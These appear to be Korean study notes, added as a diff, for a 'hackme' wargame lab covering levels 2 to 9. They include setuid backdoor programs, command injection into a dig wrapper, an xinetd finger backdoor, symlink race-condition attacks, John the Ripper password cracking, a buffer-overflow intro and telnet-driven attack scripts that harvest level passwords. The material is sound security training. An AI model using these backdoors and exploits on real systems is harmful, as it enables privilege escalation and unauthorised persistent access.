+			}
+		# gcc -o backdoor backdoor.c
+		# chmod 4755 backdoor
+		# ls -l backdoor
+		# telnet localhost
+		$ /test/backdoor
+		# id
+		# ps
+		# exit
+		$ exit
+		
+	[실습] 리버싱을 통한 의사 코드 복원 
+		(핵미)
+			$ gdb /usr/bin/deitor
+				disassembly main
+			[참고] man script 만들기
+				$ su root
+				$ vi /usr/bin/m.sh
+					#!/bin/bash
+					
+					export LANG=C
+					
+					if [ $# -eq 0 ] ; then
+							echo "Usage: $0 <function>"
+							exit 1
+					fi
+	
+					man $* | col -b | sed -n '/SYNOPSIS/,/DESCRIPTION/p'
+					
+				$ m.sh setreuid
+			$ m.sh system
+			$ m.sh setreuid
+			$ vi /tmp/editor.c
+				#include <sys/types.h>
+				#include <unistd.h>
+				#include <stdlib.h>
+				
+			int main()
+				{
+					setreuid(0xbbb,0xbbb);
+					system("/bin/vi");
+				}
+	
+	[참고] 공격 프로그램 작성시 아이디어 
+		# export HOME=/home/level2/tmp
+		# echo "! my-pass" > $HOME/.vimrc
+			
+	[실습] 공격용 프로그램 제작
+		(리눅스200)
+			# cd /hackme
+			# gedit level2.sh
+				#!/bin/bash
+
+				export TERM=xterm
+				export LANG=ko_KR.euckr
+				export LOG=level2.log
+				attack() {
+					sleep 2; echo 'hacker or cracker'
+					sleep 1; echo 'hostname'
+					sleep 1; echo 'cd tmp'
+					sleep 1; echo "echo '! my-pass' > .vimrc"
+					sleep 1; echo 'export HOME=/home/level2/tmp'
+					sleep 1; echo '/usr/bin/editor'
+					sleep 1; echo 'exit'
+				}
+				echo "[*] Attack started."
+				echo "[*] Please wait a minute."
+				attack | telnet -l level2 192.168.10.240 > $LOG 2>&1
+				RESULT=$(grep "Level3 Password" $LOG)
+				if [ $? -eq 0 ] ; then
+					echo "[+] Attack success." 
+					echo "==========================="
+					echo $RESULT
+					echo "==========================="
+				else
+					echo "[-] Attack failed."
+				fi
+
+3. Level3 -> Level4
+	단원의 목적 
+		system 함수의 취약점
+			-> system함수에서 쉘을 실행하면 서브쉘에서 띄움
+		exec 
+			-> exec함수는 쉘을 실행하면 현재쉘에서 띄움 
+	
+	[참고] dig명령어 사용법
+		(리눅스200)
+			# dig @168.126.63.1 kornet.net ANY 
+			# dig @168.126.63.1 example.com ANY 
+			# dig @168.126.63.1 google.com ANY 
+			
+	[실습]Level3 문제에 도전하기 
+		$ cat hint 
+			argv[0] 에는 커맨드가 들어감 = auto dig
+			argv[1] 에는 인자가 들어감
+			argv[2] 에는 인자가 들어감 
+		$ find / -name autodig 2>/dev/null
+		$ ls -l /bin/autodig 
+		$ find / -user level4 -perm -4000 2>/dev/null 
+		$ /bin/autodig 168.126.63.1 
+		$ dig @168.126.63.1 version.bind chaos txt 
+		$ /bin/autodig "168.126.63.1 www.naver.com; id;"
+		$ /bin/autodig "168.126.63.1 www.naver.com; bash;"
+		$ my-pass 
+
+	[실습] 백도어 만들기 
+		$ vi /tmp/backdoor.c
+			int main()
+			{			
+				char *cmd[2]; 
+				cmd[0]="/bin/bash";
+				cmd[1]=(void *)0;				-> 주소형태의 널값을 넣는거임 
+				setreuid(3004,3004);
+				execve(cmd[0], cmd, cmd[1]);   /* int  execve  (const  char  *filename, char *const argv [], char *const envp[]); */
+			}															실행할프로그램의 포인터,	cmd[0]번의 주소임 , 환경변수는 없다는것 위에 cmd[1]이 널이라 따라서 환경변수없이 쉘을 실행하는것
+		$ m.sh execve
+		$ gcc -o /tmp/". " /tmp/backdoor.c
+		$ chmod 6755 /tmp/". "
+		$ ls -al /tmp 
+		$ rm -f /tmp/backdoor.c 
+		$ exit 
+		$ id 
+		$ /tmp/". " 
+		$ id 
+		$ exit 
+	
+	[실습] 공격용 프로그램 개발
+		level3 취약점 : autodig 프로그램이 잘못 만들어져서 악의적인 command injection이 가능하다 
+		(리눅스200)
+			# gedit level3 &
+				#!/bin/bash
+
+				export TERM=xterm
+				export LANG=ko_KR.euckr
+				export LOG=level3.log
+				attack() {
+					sleep 4; echo 'can you fly?'
+					sleep 1; echo 'hostname'
+					sleep 1; echo "/bin/autodig '168.126.63.1; my-pass;'"
+					sleep 3; echo 'exit'
+				}
+
+				echo "[*] Attack started."
+				echo "[*] Please, wait a minute."
+				attack | telnet -l level3 192.168.10.240 > $LOG 2>&1
+				RESULT=$(grep 'Level4 Password' $LOG)
+				if [ $? -eq 0 ] ; then
+					echo "[+] Attack success"
+					echo "-----------------------------------------------"
+					echo $RESULT
+					echo "-----------------------------------------------"
+				else
+					echo "[-] Attack failed."
+				fi
+	
+4. Leve4 -> Level5
+	목적 : xinetd 방식 이해 		-> xinetd 백도어는 요청이 있어야만 데몬이 올라와서 찾기가 어려움 대신 netstat명령어로 확인을 가능함 
+	
+	[실습] Level4 문제에 도전하기 
+		(핵미)
+			$ cd /etc/xinetd.d 
+			$ ls -al 
+			$ cat /etc/xinetd.d/backdoor 
+				service finger
+				{
+						disable = no
+						flags           = REUSE  
+						socket_type     = stream
+						wait            = no
+						user            = level5
+						server          = /home/level4/tmp/backdoor			-> 실행하면 이러한 데몬이 움직이는 것이다 
+						log_on_failure  += USERID
+				}
+			$ cat /etc/services | grep finger 
+			$ netstat -an | grep :79 
+			$ ls -l /home/level4/tmp/backdoor 
+			$ cd ~/tmp
+			$ vi backdoor.c 
+				#include<stdlib.h>
+				int main()
+				{
+					system("cat /home/level4/hint");
+					system("id");
+					return 0;
+				}
+			$ gcc -o backdoor backdoor.c 
+			$ finger level4@localhost 
+			$ vi backdoor2.c 
+				#include <stdlib.h>
+				int main()
+				{
+					system("/bin/bash");
+				}
+			$ gcc -o backdoor backdoor2.c 
+			$ finger level4@localhost 		-> 안됨 명령어 안먹힘 이유는 명령어를 전송할때 대부분 프로토콜로 전송하기 때문에 해당 명령어가 안먹힘
+														-> 따라서 finger도 마찬가지다 id등 명령어를 쓰면 프로토콜 명령어로 바뀌기 때문에 backdoor에서 /bin/bash가 이해를 하지 못함
+															따라서 79번 포트로 nc나 telnet을 이용해서 명령어를 전송할때 그대로 전송하는 프로토콜을 사용해야한다.
+		(리눅스200)
+			# yum -y install nmap-ncat
+			# nc 192.168.10.240 79
+				id
+				my-pass
+		(핵미)
+			$ cd ~/tmp
+			$ vi backdoor2.c
+			$ gcc -o backdoor backdoor2.c
+		(리눅스200)
+			# nc 192.168.10.240 79
+	
+	[실습] 공격용 프로그램 개발
+		(리눅스200)
+			# cd hackme
+			# vi level4.sh
+				#!/bin/bash
+				export TERM=xterm
+				export LANG=ko_KR.euckr
+				export LOG=level4.log
+				export pas=level4.pas
+				attack (){
+					sleep 3; echo 'suck my brain'
+					sleep 1; echo 'hostname'
+					sleep 1; echo "echo '#include<stdlib.h>' > /home/level4/tmp/backdoor.c"
+					sleep 1; echo "echo 'main() {system(\"/bin/bash -i\");};' >> /home/level4/tmp/backdoor.c"
+					sleep 1; echo 'gcc -o /home/level4/tmp/backdoor /home/level4/tmp/backdoor.c'
+					sleep 1; echo 'exit'
+				}
+				echo "[*] Attack started."
+				echo "[*] Please, wait a minute."
+				attack | telnet -l level4 192.168.10.240 > $LOG 2>&1
+				attack2 () {
+					sleep 2; echo 'my-pass'
+					sleep 1; echo 'exit'
+				}
+				attack2 | nc 192.168.10.240 79 > $pas
+				RESULT=$(grep 'Level5 Password' $pas)
+				if [ $? -eq 0 ] ; then
+					echo "[+] Attack success"
+					echo "-----------------------------------------------"
+					echo $RESULT
+					echo "-----------------------------------------------"
+				else
+					echo "[-] Attack failed."
+				fi
+
+5. Level5 -> Level6
+	목적 : 레이스 컨디션 
+		레이스컨디션 : 다수의 프로세스가 서로 동일한 자원을 할당받기 위해 경쟁하는 상태이다.
+			조건 :
+				다른 계정의 권한에 접근해야 하므로 SetUID가 걸려 있어야 한다.
+				임시 파일을 생성해야 한다.
+				공격자가 임시로 생성되는 파일명을 정확하게 알아야 한다.
+			동작 :
+				1. 파일을 생성 	-> /tmp/tmp1
+				2. 파일 내용 실행 -> 실행할때 임시파일이 생기고 suid로 권한을 넘고 
+				3. 파일 삭제 		-> 임시파일을 삭제하고 자신의 파일에 링크를 건다.  (자신의 파일에는 bash쉘 실행하는것을 넣는다)
+	
+	[실습] Level5 문제에 도전하기 
+		$ ls -l 
+		$ cat hint
+		$ ls -l /usr/bin/level5 
+		$ find / -user level6 -perm -4000 2>/dev/null 
+		$ /usr/bin/level5 ; ls -l /tmp/level5.tmp 			-> 파일이 빠르게 생성되었다가 빨리 지워져서 안보임 
+		$ cd tmp
+		$ vi runTarget.c											-> 실행 파일을 10번 돌린다 
+			#include <unistd.h>
+			int main(void)
+			{
+       			int i;
+       			for(i=0; i<10; i++)
+       			{
+               			system("/usr/bin/level5 &");
+       			}
+			}
+		$ gcc -o runTarget runTarget.c
+		$ vi Attack_Target.c										-> 공격하는 파일
+			#include<unistd.h>
+			int main()
+			{
+        			int i;
+			
+        			system("touch /tmp/18pass.txt");
+        			for(i=0; i<=10; i++)
+        			{
+                			system("ln -s /tmp/18pass.txt /tmp/level5.tmp");
+        			}
+        			system("cat /tmp/18pass.txt");
+        			system("rm -rf /tmp/18pass.txt");
+			}
+		$ gcc -o Attack_Target Attack_Target.c 
+		$ vi Attack_Target.sh 
+			#!/bin/bash
+			#
+			#       # gcc -o Attack_Target Attack_Target.c
+			#       # gcc -o runTarget runTarget.c
+			#       # ./Attack_Target.sh
+			#
+			./runTarget &
+			./Attack_Target
+		$ chmod 755 *.sh
+		$ ./Attack_Target.sh
+	
+	[실습] 공격용 프로그램 개발 
+		쓰레드	 : 힙메모리를 만들어 놓고 텍스트 메모리를 공동으로 사용하는 것이다
+		프로세스 : 각 프로세스 마다 텍스트메모리를 따로 사용한다 
+		$ vi Attack_Target2.c
+			#include <stdio.h>
+			#include <stdlib.h>
+			#include <pthread.h>
+
+			void *exec_cmd();
+			void *exec_race();
+
+			int main()
+			{
+				pthread_t thread1, thread2;
+				char *message1 = "Thread 1";
+				char *message2 = "Thread 2";
+			
+				int iret1, iret2, i;
+			
+				iret1 = pthread_create(&thread1, NULL, exec_cmd, (void *) message1);
+				iret2 = pthread_create(&thread2, NULL, exec_race, (void *) message2);
+			
+				pthread_join(thread1, NULL);
+				pthread_join(thread2, NULL);
+			
+				printf("Thread1 return: %d\n", iret1);
+				printf("Thread2 return: %d\n", iret2);
+			
+				return 0;
+			}
+			
+			void *exec_cmd()
+			{
+				int i;
+			
+				for(i=0; i<10; i++)
+				{
+	        			system("/usr/bin/level5 &");
+	        			printf("---------- Execute level5 ----------\n");
+				}
+				exit(0);
+			}
+			
+			void *exec_race()
+			{
+				int i;
+				system("touch /tmp/18pass.txt");
+				for(i=0; i<10; i++)
+				{
+	        			system("ln -s /tmp/18pass.txt /tmp/level5.tmp &");
+	        			printf("=========== Sucessfully create link !!! ========\n");
+	        			system("cat /tmp/18pass.txt");
+				}
+				exit(0);
+			}
+		$ su - root
+		# rm -f /tmp/18pass.txt /tmp/level5.tmp 
+		# exit
+		$ gcc -o Attack_Target Attack_Target2.c -pthread 					
+		$ ./Attack_Target 
+		$ telnet localhost 
+			level6/what the hell
+	
+	[실습] 리버싱을 통한 의사 코드 복원
+		$ ls -l /usr/bin/level5 
+		$ su root 
+		$ gdb /usr/bin/level5 
+		$ vi level5.c
+			/* header */
+			#include <sys/types.h>
+			#include <sys/stat.h>
+			#include <fcntl.h>
+			#include <stdio.h>
+			#include <stdlib.h>
+			#include <unistd.h>
+
+			/* global */
+			
+			/* function */
+			
+			/* main function */
+			int main()
+			{
+        			int fd;
+        			fd = creat("/tmp/level5.tmp",0x180);
+        			if (fd < 0)
+        			{
+                			printf("Can not creat a temporary file.\n");
+                			remove("/tmp/level5.tmp");
+                			exit(0);
+        			}
+        			write(fd, "next password : what the hell\n", 0x1f);
+        			close(fd);
+        			remove("/tmp/level5.tmp");
+			}
+		$ su - root
+		$ rm -f /tmp/18pass.txt /tmp/level5.tmp /tmp/level6
+	
+	[실습] 공격 프로그램 만들기 
+		$ cd ~/tmp
+		$ vi raceon1.c
+			#include <stdio.h>
+			int main()
+			{
+				while(1) system("/usr/bin/level5");
+				return 0;
+			}
+		$ vi racecon2.c 
+			#include <stdio.h>
+			int main()
+			{
+				system("touch /tmp/level6");
+				while(1) system("ln -s /tmp/level6 /tmp/level5.tmp");
+				return 0;
+			}
+		$ vi racecon3.c
+			#include <stdio.h>
+			int main()
+			{
+				while(1) system("tail -f /tmp/level6");
+				return 0;
+			}
+		$ gcc -o raceon1 raceon1.c
+		$ gcc -o raceon2 raceon2.c
+		$ gcc -o raceon3 raceon3.c
+		$ ./raceon1 & ./raceon2 2>/dev/null & ./raceon3 2>/dev/null
+		$ pgrep -lf racecon
+		$ pgrep racecon
+		$ kill -9 `pgrep racecon`
+
+6. Level6 -> Level7
+	목적 : signal() 함수의 취약점 
+		시그널 함수는 개발자가 원하는 행동을 하게 하는 것이 주 목적이다.
+		시그널이란 하나의 프로세스(Process)가 다른프로세스(Process)에게 보내는 비동기적 알림 이벤트 메세지이다.
+			ex) kill -9 PID 
+		
+	[실습] 시그널에 대해서
+		(리눅스 200)
+			# export LANG=C
+			# what is signal 
+			# man 7 signal
+				Term 은 동작시키면 종료
+				Core 는 동작시키면 코어로 덤프를 뜨고 종료 
+				Ign   는 무시하는것 
+				Cont 는 스탑한거를 실행
+				Stop 는 스탑하기 
+			# kill -l
+			# cd /usr/include
+			# find . -name signal.h -type f 
+				./asm/signal.h				-> asm은 어셈블리어란 뜻임
+				./asm-generic/signal.h
+				./linux/signal.h
+				./signal.h
+				./sys/signal.h
+			# cat /usr/include/asm/signal.h
+		
+	[실습] 시그널 함수 
+		signal(시그널번호, SIG_DFL)	signal(SIGINT, SIG_DFL)	SIGINT 시그널 실행
+		signal(시그널번호, SIG_IGN)	signal(SIGQUIT, SIG_IGN)	SIGQUIT 시그널 무시
+		signal(시그널번호, handler함수)	signal(SIGINT, handler)	SIGINT(CTRL + C)가 입력되면 handler() 함수를 실행
+	
+	[실습] 시그널 함수 사용해 보기 
+		(리눅스200)
+			<CTRL + C> : 2번 시그널		-> 인터럽트 종료
+			<CTRL + \> : 3번 시그널		-> core생성하고 종료
+			<CTRL + Z> : 20번 시그널	-> 스탑 
+			# vi sig.c 	
+				● 프로그램 실행 중 <CTRL + C>로 프로그램을 종료 할 수 없도록 한다.
+				#include <stdio.h>
+				#include <signal.h>
+				#include <unistd.h>
+
+				main()
+				{
+					signal(2, SIG_IGN);
+					while (1) sleep(1);
+				}
+			# gcc sig.c
+			# ./a.out
+			# vi sig.c 	
+				● 프로그램 실행 중 <CTRL + C>로 프로그램을 종료 할 수 없도록 한다.
+				● 또한, <CTRL + C> 입력시 사용할 수 없다는 메세지를 출력한다.
+				#include<stdio.h>
+				#include<signal.h>
+				#include<unistd.h>
+
+				void sig_fun(int signo)
+				{
+					printf("\nCan't use <CTRL + C>\n");
+				}
+
+				void main()
+				{
+					signal(SIGINT, sig_fun);
+					while (1) sleep(1);
+				}
+			# gcc sig.c
+			# ./a.out
+			# vi sig.c 	
+				● 프로그램 실행 중 <CTRL + C>로 프로그램을 종료 할 수 없도록 한다.
+				● 또한, <CTRL + C> 입력시 사용할 수 없다는 메세지를 출력한다.
+				● SIGINT 시그널을 catch 하지 못한 경우 에러 메세지를 출력한다.
+				#include<stdio.h>
+				#include<signal.h>
+				#include<unistd.h>
+				
+				void sig_fun(int signo)
+				{
+					printf("\nCan't use <CTRL + C>\n");
+				}
+				
+				void main()
+				{
+					if (signal(SIGINT, sig_fun) == SIG_ERR)
+						printf("\nCan't catch signal.\n");
+					while (1) sleep(1);
+				}
+			# gcc sig.c
+			# ./a.out
+			# vi sig.c
+				● 프로그램 실행 중 2번부터 10번 시그널 까지로 프로그램을 종료 할 수 없도록 한다.
+				● 또한, <CTRL + C> 입력시 사용할 수 없다는 메세지를 출력한다.
+				● 나머지 시그널(3번부터 10번까지)은 무시한다.
+				#include<stdio.h>
+				#include<signal.h>
+				#include<unistd.h>
+
+				void sig_fun(int signo)
+				{
+					printf("\nCan't use %d\n", signo);
+				}
+								
+				void main()
+				{
+					int i;
+					for(i=2; i<=10; i++)
+						if (i == SIGINT) signal(i, sig_fun);
+						else             signal(i, SIG_IGN);
+					while (1) sleep(1);
+				}
+			# gcc sig.c
+			# ./a.out	
+	
+	[실습] Level6 문제에 도전하기 
+		접속 -> 힌트 :: 인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다.
+		-> enter
+		-> 이상한 프로그램이 실행된다 (telnet형태)
+		-> 프롬프트가 뜨지 않음
+		-> 시그널을이용해서 로그인을 하고 엔터를 치지 않고 ctrl+c를 누르면 프롬트프 획득 
+		$ cat password
+		
+	[실습] 리버싱을 통한 의사 코드 복원 
+		#include <stdlib.h>
+		#include <stdio.h>
+		#include <signal.h>
+		
+		void sig_func(int signo)
+		{
+		        printf("Can't use ctrl+c\n");
+		}
+		
+				main()
+		{
+		        int i;
+		        system("cat hint");
+				getchar();
+        		system("clear");
+    		printf("#####################################\n");
+    		printf("##                                 ##\n");
+    		printf("##        텔넷 접속 ▒ ▒비##\n");
+    		printf("##                                 ##\n");
+    		printf("## 1. 하이텔   2. 나우▒ ##\n");
+    		printf("## 3. 천리안                   ##\n");
+    		printf("##                                 ##\n");
+    		printf("#####################################\n");
+		
+		        signal(0x2,sig_func);
+		        printf("\nselect bbs");
+		        scanf("%d",i);
+		        switch(i)
+		        {
+                		case 1:
+		                        system("telnet 203.245.15.76");
+                         		break;
+                		case 2:
+		                        system("telnet 203.238.129.97");
+                        		break;
+                		case 3:
+		                  		system("telnet 210.120.128.180");
+                        		break;
+                		default :
+		                		if (i != 1 && i!=2 && i!=3)
+                		printf("잘못 입력하셨습니다. 접속을 종료합니다.\n");
+                		break;
+        		}
+		}
+	
+	[실습] 공격 프로그램 개발 
+		#!/bin/bash
+		export TERM=xterm
+		export LANG=ko_KR.euckr
+		export LOG=level6.log
+		attack() {
+			sleep 2; echo 'what the hell'
+			sleep 1; echo ''
+			sleep 1; echo 'cat password'
+			sleep 1; echo 'exit'
+		}
+		echo "[*] Attack started."
+		echo "[*] Please, wait a minute."
+		attack | telnet -l level6 192.168.10.240 > $LOG 2>&1
+		RESULT=$(grep 'Level7 password' $LOG)
+		if [ $? -eq 0 ] ; then
+			echo "[+] Attack success"
+			echo "-----------------------------------------------"
+			echo $RESULT
+			echo "-----------------------------------------------"
+		else
+			echo "[-] Attack failed."
+		fi
+
+7. Level7 -> Level8
+	목적 : 암호학에 대해서(2진수 <-> 10진수 <-> 16진수)
+	
+	[실습] Level7 문제에 도전하기 
+		$ cat hint
+		$ find / -user level7 2>/dev/null
+		$ find / -user level8 -perm -4000 2>/dev/null
+		$ /bin/level7
+			올바르지 않은 패스워드 입니다.
+			패스워드는 가까운곳에...
+			--_--_- --____- ---_-__ --__-_-	-> 이진수임 10진수로 바꾸고 16진수로 바꾸고 아스키보기 
+		$ export LANG=C
+		$ man ascii
+		$ /bin/level7
+			mate
+		[참고] ASCII Table
+			문자 0 -> 16진수 : 0x30
+			문자 A -> 16진수 : 0x41
+			문자 a -> 16진수 : 0x61
+			특수문자 '\n' ->16진수 : 0x0a
+			특수문자 '\r' -> 16진수 : 0x0d
+				Windsow (\r\n -> 0x0d0x0a)
+				Linux (\n -> 0x0a)
+	
+	[실습] 공격용 프로그램 개발 
+		위의 작대기를 이진수로 바꾸고 바꾼이진수는 수가 아니라 문자기 때문에
+		해당 문자를 십진수로 바꾸고 십진수를 아스키테이블에서 문자로 바꾼다.
+		
+		형식
+			Resvered signals : --_--_- --____- ---_-__ --__-_-
+			Changed binary : 1101101 1100001 1110100 1100101
+			Changed decimal :  109  97  116  101
+			Changed Hexdecimal:  109  97  116  101
+			Changed ascii : m  a  t  e
+			<ENTER> 
+			Insert The Password :
+			Congratulation! next password is "break the world".
+			<ENTER>
+		
+		코드
+			/* header */
+			#include <stdio.h>
+
+			/* global */
+
+			/* functions */
+			int binToint(char *bin)
+			{
+        			int i=0;
+        			int count=0;
+			
+        			while (bin[count])
+        			{
+                			i=(i<<1)|(bin[count++]-'0');
+        			}
+        			return i;
+			}
+			
+			/* main functions */
+			int main()
+			{
+        			char *bin="--_--_- --____- ---_-__ --__-_- ";
+        			char *ptr = bin;
+        			char dec[32];
+        			int i;
+        			char decimal[4];
+        			char cmd[50];
+			
+        			/* signal code */
+        			printf("Resvered signals    : --_--_- --____- ---_-__ --__-_- \n");
+			
+        			/* binary cod */
+        			for (i=0; i<strlen(bin); i++)
+        			{
+                			if              (*ptr == '-')   dec[i]='1';
+                			else if (*ptr == '_')   dec[i]='0';
+                			else if (*ptr == ' ')   dec[i]='\0';
+                			else    exit(1);
+                			ptr ++;
+        			}
+        			printf("Changed binary      : %s %s %s %s\n", &dec[0], &dec[8], &dec[16], &dec[24]);
+			
+        			/* decimal code */
+        			printf("Changed decimal     :");
+        			for(i=0; i<4; i++)
+        			{
+                			decimal[i] = binToint(&dec[i*8]);
+			        		printf(" %d ", decimal[i]);
+        			}
+        			printf("\n");
+			
+        			/* hexdecimal code */
+        			printf("Changed hexdecimal  : %x  %x  %x  %x\n", decimal[0], decimal[1], decimal[2], decimal[3]);
+			
+        			/* ascii code */
+        			printf("Changed ascii       : %c  %c  %c  %c\n", decimal[0], decimal[1], decimal[2], decimal[3]);
+			
+        			/* Attack code */
+        			/* (printf made: cat) | /bin/level7 */
+        			sprintf(cmd, "(printf %c%c%c%c ; cat) | /bin/level7", decimal[0], decimal[1], decimal[2], decimal[3]);
+        			system(cmd);
+        			return 0;
+			}
+	
+	[실습] 리버싱을 통한 의사 코드(가상 코드) 복원
+		#include <stdlib.h>
+		#include <stdio.h>
+		#include <string.h>
+		#include <unistd.h>
+		main()
+		{
+		        char *ost;
+		        ost=malloc(0x64);
+		        printf("Insert The Password : ");
+        		fgets(ost, 0x64, stdin);
+        		if(strncmp(ost, "mate", 0x4)==0)
+        		{
+		                printf("\nCongratulation! next password is \"break the world\".\n\n");
+                		exit(0);
+        		}
+		
+		        system("cat /bin/wrong.txt");
+		}
+
+	
+8. Level8 -> Level9
+	목적 : 패스워드 크랙 
+	
+	[실습] Level8 문제에 도전하기(Level8 -> Level9)
+		(핵미)
+			$ level8/break the world
+			$ cat hint
+			$ find / -size 2700c -type f 2>/dev/null
+				1개의 캐릭터가 1바이트라서 2700바이트를 말하는것임 
+			$ cat /etc/rc.d/fount.txt
+			$ cat /etc/rc.d/found.txt | sort -u
+			$ cat /etc/rc.d/found.txt | sort -u | grep -v '^$'
+			$ cat /etc/rc.d/found.txt | sort -u | grep -v '^$' > tmp/password.txt
+		(원본)
+			http://www.openwall.com/john/ 	존더리퍼다운
+				password.txt에 위의 파일내용 넣기 
+				설치 후 해당 파일에서 쉬프트누르고 우클릭 후에 명령창 열고 john password.txt 하기 
+	
+	[실습] 공격용 프로그램 개발 
+		(리눅스200)
+			http://www.openwall.com/john/ 에서 예전 버전 다운로드 wget으로
+				# wget --no-check-certificate https://download.openwall.net/pub/projects/john/1.9.0/john-1.9.0.tar.gz
+				# tar xvzf john-1.9.0.tar.gz
+				# cd john-1.9.0
+				# cd src	
+				# make
+				# make clean generic
+				# ../run/john --test 
+				# ln -s ~/hackme/john-1.9.0 ~/hackme/john
+			# vi ~/hackme/level8.sh
+				#!/bin/bash
+				export LANG=ko_KR.eucKR
+				export TERM=xterm
+				export CMD="cat /etc/rc.d/found.txt | sort -u | grep -v '^$'"
+				export LOG=level8.log
+				export JOHN=/root/hackme/john/run/john
+				attack() {
+					sleep 3; echo 'break the world'
+					sleep 1; echo 'hostname'
+					sleep 1; echo "$CMD"
+					sleep 1; echo 'exit'
+				}
+				echo "[*] Attack started."
+				echo "[*] Please wait a minute."
+				attack | telnet -l level8 192.168.10.240 > $LOG 2>&1
+				grep level9 $LOG > password.txt 2>&1
+				
+				if [ $? -eq 0 ] ; then
+					echo "[+] Attack success."
+					echo "============================="
+					$JOHN /root/hackme/password.txt >/dev/null 
+					$JOHN --show /root/hackme/password.txt | awk -F: '{print $1, ":", $2}' | grep level9
+					echo "============================="
+				else
+					echo "[-] Password Crack failed."
+					exit 1
+				fi
+
+9. Level9 -> Level10
+	목적 : 버퍼오버플로우 소개 
+	
+	버퍼오버플로우 = 저장공간보다 입력을 더 많이 할수있게 되면 더욱 많이 입력되면 메모리가 오버라이트되는데 이렇게 메모리를 조작할수있는것이다.
+		스택버퍼오버플로우 : 권한상승
+		힙버퍼오버플로우	: 정보획득 
+		
+	트리거 = 정상동작하다가 우리가 원하는 상태가 되는것이 트리거임 
+	
+	더미공간 : 변수와 변수 사이에는 거리가 생기는데 이 거리가 더미공간이다 이게 생기는 이유는 cpu가 읽을때 1010으로 바뀐걸 읽기 좋게하기 위해서 만듬 
+	공간파악 : 스택의 시작주소는 운영체제의 권한이 없으면 확인을 못하지만 자기가 지정한 변수의 주소는 확인 할 수 있음 
+				  2개의 변수의 첫번째 주소(&CC)와 두번째 주소(&DD)를 빼고 변수DD의 sizeof를 했을때 같으면 더미공간이 없는것 
+	
+	운영체제는 읽어들일때 주소를 짝수를 만들기 때문에 이러한 더미공간이 생긴다 
+		짝수공간 ? = 짝수로 만들어야 읽기 쉽기 때문이다 cpu가 
+		
+	[참고] gdb사용법 
+		(핵미)
+			$ ls -l
+			$ cd tmp
+			$ vi distance.c
+				#include <stdio.h>
+				int main()
+				{
+					char AA;
+					char strAA[1];
+					char strBB[2];
+					char strCC[3];
+					char strDD[5];
+					char strEE[9];
+					char strFF[17];
+
+							printf("AA's address: 0x%x, sizeof: 0x%x\n", &AA, sizeof(AA));
+        					printf("strAA[1]'s address: 0x%x, sizeof: 0x%x, distance: 0x%x\n", strAA, sizeof(strAA), &AA - strAA);
+        					printf("strBB[2]'s address: 0x%x, sizeof: 0x%x, distance: 0x%x\n", strBB, sizeof(strBB), strAA - strBB);
+        					printf("strCC[3]'s address: 0x%x, sizeof: 0x%x, distance: 0x%x\n", strCC, sizeof(strCC), strBB - strCC);
+        					printf("strDD[5]'s address: 0x%x, sizeof: 0x%x, distance: 0x%x\n", strDD, sizeof(strDD), strCC - strDD);
+        					printf(" strEE[9]'s address: 0x%x, sizeof: 0x%x, distance: 0x%x\n", strEE, sizeof(strEE), strDD - strEE);
+        					printf("strFF[17]'s address: 0x%x, sizeof: 0x%x, distance: 0x%x\n", strFF, sizeof(strFF), strEE - strFF);
+					return 0;
+				}
+			$ gcc -o distance distance.c
+			
+		gdb사용법
+			정적분석 : disassembly 해서 전체적으로 보는것
+			동적분석 : 브레이크 포인트를 걸고 하나씩 하면서 보는것 
+			
+			list
+				$ gdb -g -o test test.c
+					바이너리로 바꿔주고 원래 test.c코드를 바이너리와 맵핑시켜서 보여준다 
+					l 을 누르면 볼 수 있음 
+			disassemble 주소/함수명
+				함수 디스어셈블해 코드 보여줌 
+			run
+				run arg1 arg2
+			continue
+				브레이크 걸린 상태에서 계속 진행 
+			break 주소/함수명/라벨
+				주소   : break *0x8049000
+				함수명: break func
+				라벨	 : break *main+38
+			x/32x 주소
+				주소에서 32개를 16진수로 출력(x/32s는 문자열)(EX: x/32x 0xbfffed60)
+				다음은 출력형식에 대한 다양한 예이다.
+				x/4d 주소 : 주소에서 4개를 10진수로 출력
+				x/4x 주소 : 주소에서 4개를 16진수로 출력
+				x/4s 주소 : 주소에서 4개를 문자열로 출력
+			info registers
+				레지스터 값 출력
+			info functions
+				함수 리스트 확인
+			next i
+				함수 내부로 안들어가고 라인 실행
+			step i
+				함수 내부로 들어가고 라인 실행 
+			backtrace
+				프로그램 실행의 스택 추적 결과 출력
+				break를 건 후 프로그램을 실행하고 나서 스택의 내용을 볼수 있는 명령어
+				(약자) bt
+		
+		[실습] gdb사용
+			(핵미)
+				$ cd ~/tmp
+				$ vi bof.c
+					#include <stdio.h>
+					#include <stdlib.h>
+					#include <unistd.h>
+					main()
+					{
+        					char buf2[10];
+        					char buf[10];
+										
+        					printf("It can be overflow : ");
+        					fgets(buf, 40, stdin);
+
+        					if(strncmp(buf2, "go", 2) == 0)
+        					{
+                					printf("Good Skill!\n");
+                					setreuid(3010, 3010);
+                					system("/bin/bash");
+        					}
+					}
+			$ gcc -g -o bof bof.c
+			$ gdb -q bof
+				quit
+			$ gdb 
+				file /home/level9/tmp/bof
+				help
+				help data
+				list	-> 코드 상단 10줄 보여줌
+				list 1,20
+				disassemble main
+				run
+					AAAA	-> 입력은 항상 4바이트씩 해야함 
+				break *0x08048438 -> 입력값 전 후에 변화를 줄수있는 부분에 브레이크포인터를 건다.
+				break *0x0804844f
+				break *0x080484a6
+				info breakpoints
+				run
+					c
+					c
+					c
+						AAAA
+					c
+				run
+					c
+					c
+					c
+						AAAA
+							x/s buf	-> 버퍼안에있는 것을 문자열로 볼 수 있음 
+							x/s buf2 -> 문자열로 버퍼2봄
+							x/x buf2 -> 16진수로 볼수있음 
+					info registers
+						레지스터와 16진수와 10진수를 나타냄 똑같으면 값이 없는것 
+					run
+						ni
+						si
+				help
+				help backtrace
+				backtrace
+				quit
+	
+	[실습] Level9 문제에 도전하기(Level9 -> Level10)
+		(핵미)
+			$ cd
+			$ ls -l
+			$ cat hint 
+			$ cd tmp
+			$ vi bof.c
+				#include <stdio.h>
+				#include <stdlib.h>
+				#include <unistd.h>
+				main()
+				{
+					char buf2[10];
+					char buf[10];
+									
+					printf("It can be overflow : ");
+					fgets(buf, 40, stdin);
+	
+					if(strncmp(buf2, "go", 2) == 0)
+						{
+							printf("Good Skill!\n");
+							setreuid(3010, 3010);
+							system("/bin/bash");
+						}
+				}
+			$ gcc -g -o bof bof.c 
+			$ ./bof
+				AAAA
+			$ gdb bof
+				disassemble main	-> 리버싱파일에 해석파일 있음 
+			$ find / -perm -4000 2>/dev/null
